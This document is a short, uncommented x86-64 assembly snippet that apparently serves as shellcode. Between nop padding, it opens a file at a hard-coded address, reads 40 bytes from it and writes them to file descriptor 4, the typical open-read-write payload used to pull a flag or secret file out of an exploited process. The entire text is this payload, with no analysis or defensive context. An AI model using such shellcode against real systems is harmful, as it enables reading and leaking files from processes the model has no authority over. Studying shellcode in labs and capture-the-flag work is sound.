nop
nop
nop
mov rax, 2
mov rdi, 0x601000
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
xor rax, rax
mov rsi, 0x601c00
mov rdx, 40
syscall
mov rax, 1
mov rdi, 4
syscall
nop
nop
nop
